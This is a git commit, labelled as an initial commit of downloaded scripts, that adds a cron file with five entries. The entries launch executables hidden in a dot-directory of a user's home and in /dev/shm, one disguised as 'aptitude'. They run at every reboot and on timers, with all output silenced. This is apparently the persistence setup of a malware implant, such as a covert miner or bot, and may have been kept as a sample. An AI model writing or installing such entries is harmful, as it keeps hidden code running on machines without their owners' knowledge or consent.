ebf2d8cb2d20c591f7a9430204cb1878ce263ac5
Mitanshu Sukhwani <mitanshu.sukhwani@gmail.com>
2023-09-22 14:41:00 +0530

    initial commit of downloaded scripts

---
+++ .configrc5/cron.d
@@ -0,0 +1,5 @@
+5 6 * * 0 /home/madhu/.configrc5/a/upd>/dev/null 2>&1
+@reboot /home/madhu/.configrc5/a/upd>/dev/null 2>&1
+5 8 * * 0 /home/madhu/.configrc5/b/sync>/dev/null 2>&1
+@reboot /home/madhu/.configrc5/b/sync>/dev/null 2>&1
+0 0 */3 * * /dev/shm/.Xzqo/.rsync/c/aptitude>/dev/null 2>&1
